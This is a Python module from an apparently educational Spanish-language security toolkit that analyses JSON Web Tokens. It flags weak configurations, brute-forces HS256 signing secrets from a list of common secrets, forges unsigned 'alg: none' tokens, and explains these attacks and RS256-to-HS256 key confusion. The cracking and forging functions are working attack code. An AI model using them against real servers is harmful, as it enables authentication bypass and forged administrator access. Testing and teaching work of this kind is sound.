"""
jwt_analyzer.py — Herramienta 16: Analizador de JWT
Decodificación, inspección y ataques básicos a JSON Web Tokens (JWT).
(alg: none, fuerza bruta de secreto HS256).
"""

import sys
import os
import json
import base64
import hmac
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed

# Asegura que el directorio raíz esté en el path al ejecutar directamente
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils import (
    ok, error, warn, info, result,
    section_title, separator, dim, cyan, green, yellow, white, red, magenta,
    prompt, pause
)

# Diccionario de secretos comunes para JWT (educativo)
_COMMON_SECRETS = [
    "secret", "123456", "password", "admin", "secret123", "key",
    "supersecret", "secretkey", "jwtsecret", "test", "demo"
]

def _decode_b64url(data: str) -> bytes:
    """Decodifica Base64-URL seguro, agregando padding si falta."""
    padding = '=' * (4 - (len(data) % 4))
    return base64.urlsafe_b64decode(data + padding)


def _encode_b64url(data: bytes) -> str:
    """Codifica a Base64-URL sin padding (como requiere JWT)."""
    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')


def _sign_hs256(header_b64: str, payload_b64: str, secret: str) -> str:
    """Firma un token JWT (header.payload) usando HMAC-SHA256 y un secreto."""
    msg = f"{header_b64}.{payload_b64}".encode('utf-8')
    sig = hmac.new(secret.encode('utf-8'), msg, hashlib.sha256).digest()
    return _encode_b64url(sig)


def _brute_force_worker(header_b64: str, payload_b64: str, original_sig: str, secrets: list[str]) -> str | None:
    for secret in secrets:
        sig = _sign_hs256(header_b64, payload_b64, secret)
        if sig == original_sig:
            return secret
    return None


def _mode_analyze() -> None:
    section_title("ANALIZADOR DE JWT")

    token = prompt("Ingresá el JSON Web Token").strip()
    if not token:
        warn("No se ingresó ningún token.")
        return

    parts = token.split('.')
    if len(parts) not in (2, 3):
        error("Formato JWT inválido. Debe tener 3 partes separadas por puntos (header.payload.signature).")
        return

    header_b64 = parts[0]
    payload_b64 = parts[1]
    signature_b64 = parts[2] if len(parts) == 3 else ""

    print()
    info("Decodificando token...")

    try:
        header_json = json.loads(_decode_b64url(header_b64).decode('utf-8'))
        payload_json = json.loads(_decode_b64url(payload_b64).decode('utf-8'))
    except Exception as e:
        error(f"No se pudo decodificar el token Base64: {e}")
        return

    alg = header_json.get("alg", "UNKNOWN").upper()

    separator("─", 60)
    print(f"  {white('HEADER:')}")
    print(cyan(json.dumps(header_json, indent=4)))
    separator("─", 60)
    print(f"  {white('PAYLOAD (Claims):')}")
    print(green(json.dumps(payload_json, indent=4)))
    separator("─", 60)
    
    if signature_b64:
        print(f"  {white('FIRMA:')} {dim(signature_b64)}")
    else:
        print(f"  {white('FIRMA:')} {yellow('Ninguna (Token sin firmar)')}")
    separator("─", 60)

    # Detección de vulnerabilidades / Advertencias
    print()
    info("Análisis de seguridad:")
    
    # 1. alg: none
    if alg == "NONE":
        print(f"  {red('↳ ⚠ CRÍTICO: Vulnerabilidad alg: none detectada.')}")
        print(f"  {dim('El servidor podría aceptar este token sin verificar la firma.')}")
    else:
        print(f"  {green('✓')} Algoritmo no es 'none'.")

    # 2. Información sensible en payload
    sensitive_keys = ['password', 'pwd', 'secret', 'token', 'hash', 'ssn', 'cc']
    found_sens = [k for k in payload_json.keys() if any(s in k.lower() for s in sensitive_keys)]
    if found_sens:
        print(f"  {yellow('↳ ⚠ PRECAUCIÓN: Posible info sensible en payload:')} {', '.join(found_sens)}")
        print(f"  {dim('Los JWT no están cifrados, solo codificados. Cualquiera puede leer esto.')}")
    
    # 3. Fuerza bruta si es HS256
    if alg == "HS256" and signature_b64:
        print()
        if prompt("El token usa HS256. ¿Querés intentar fuerza bruta del secreto? (s/n)", default="n").lower() == "s":
            dict_path = prompt("Ruta al diccionario (enter para usar el interno rápido)", default="")
            words = []
            if dict_path and os.path.exists(dict_path):
                try:
                    with open(dict_path, "r", encoding="utf-8", errors="ignore") as f:
                        words = [l.strip() for l in f if l.strip()]
                except Exception:
                    warn("No se pudo leer el diccionario. Usando el interno.")
            
            if not words:
                words = _COMMON_SECRETS
                
            info(f"Iniciando fuerza bruta con {len(words)} secretos...")
            
            # Multi-threading para fuerza bruta
            chunk_size = max(1, len(words) // 4)
            chunks = [words[i:i + chunk_size] for i in range(0, len(words), chunk_size)]
            
            found_secret = None
            with ThreadPoolExecutor(max_workers=4) as executor:
                futures = {executor.submit(_brute_force_worker, header_b64, payload_b64, signature_b64, chunk): i for i, chunk in enumerate(chunks)}
                for future in as_completed(futures):
                    res = future.result()
                    if res:
                        found_secret = res
                        break
            
            if found_secret:
                print(f"  {green('✓ ¡SECRETO ENCONTRADO!')} -> {red(found_secret)}")
                print(f"  {dim('Con este secreto podés forjar tokens válidos para este servidor.')}")
            else:
                warn("No se encontró el secreto en el diccionario.")
    print()


def _mode_forge() -> None:
    section_title("FORJADOR DE TOKENS JWT (alg: none)")

    info("Esta función crea un token sin firma (alg: none) para probar si el servidor es vulnerable.")
    
    header = {"typ": "JWT", "alg": "none"}
    
    print("Ingresá el Payload en formato JSON (Ej: {\"user\":\"admin\"}):")
    payload_str = prompt("Payload JSON")
    
    try:
        payload = json.loads(payload_str)
    except json.JSONDecodeError:
        error("Formato JSON inválido.")
        return
        
    header_b64 = _encode_b64url(json.dumps(header).encode('utf-8'))
    payload_b64 = _encode_b64url(json.dumps(payload).encode('utf-8'))
    
    forged_token = f"{header_b64}.{payload_b64}."
    
    print()
    result("Token forjado", forged_token)
    warn("Notá el punto (.) al final. Indica que la firma está vacía.")
    print()


def _mode_explain() -> None:
    section_title("¿QUÉ ES UN JWT Y CÓMO SE ATACA?")

    print(f"""
  {white('1. Estructura de un JWT')}
  {dim('─' * 56)}
  Un JSON Web Token tiene 3 partes separadas por puntos ( . ):
  {cyan('HEADER')} . {green('PAYLOAD')} . {yellow('SIGNATURE')}
  Las partes no están encriptadas, solo codificadas en Base64.
  Cualquiera puede decodificarlas y leer su contenido.

  {white('2. Vulnerabilidad alg: none')}
  {dim('─' * 56)}
  El header especifica el algoritmo (ej. HS256). Si se cambia a "none" y el
  servidor tiene una librería desactualizada o mal configurada, 
  {red('aceptará el token sin comprobar la firma.')}
  Esto permite forjar tokens con privilegios de administrador.

  {white('3. Firmas Débiles (HS256)')}
  {dim('─' * 56)}
  HS256 usa un secreto simétrico (la misma clave firma y verifica).
  Si el desarrollador usó una clave débil (ej. "secret123"), un atacante
  puede hacer fuerza bruta offline, descubrir la clave y {red('forjar tokens válidos')}.

  {white('4. Confusión de Clave (RS256 a HS256)')}
  {dim('─' * 56)}
  RS256 usa clave pública/privada. Si el servidor espera RS256 pero el 
  atacante cambia el alg a HS256 y usa la clave pública del servidor 
  como secreto HMAC, el servidor podría {red('verificarlo erróneamente.')}
    """)


# ──────────────────────────────────────────────
#  Submenú
# ──────────────────────────────────────────────
_SUBMENU = [
    ("1", "Analizar / Decodificar Token",         _mode_analyze),
    ("2", "Forjar Token (alg: none attack)",      _mode_forge),
    ("3", "¿Qué es JWT y vulnerabilidades?",      _mode_explain),
]

def _print_submenu() -> None:
    print()
    info("¿Qué querés hacer?")
    separator("─", 58)
    for key, label, _ in _SUBMENU:
        print(f"  {cyan(f'[{key}]')} {white(label)}")
    print(f"  {red('[0]')} {dim('Volver al menú principal')}")
    separator("─", 58)


# ──────────────────────────────────────────────
#  Punto de entrada
# ──────────────────────────────────────────────
def run() -> None:
    while True:
        section_title("HERRAMIENTA 16 — ANALIZADOR DE JWT")
        _print_submenu()

        choice = prompt("Opción", default="0")

        if choice == "0":
            break

        matched = False
        for key, _, func in _SUBMENU:
            if choice == key:
                matched = True
                try:
                    func()
                except KeyboardInterrupt:
                    print()
                    warn("Operación cancelada.")
                break

        if not matched:
            error("Opción no válida. Ingresá un número del 0 al 3.")

        pause()


if __name__ == "__main__":
    run()
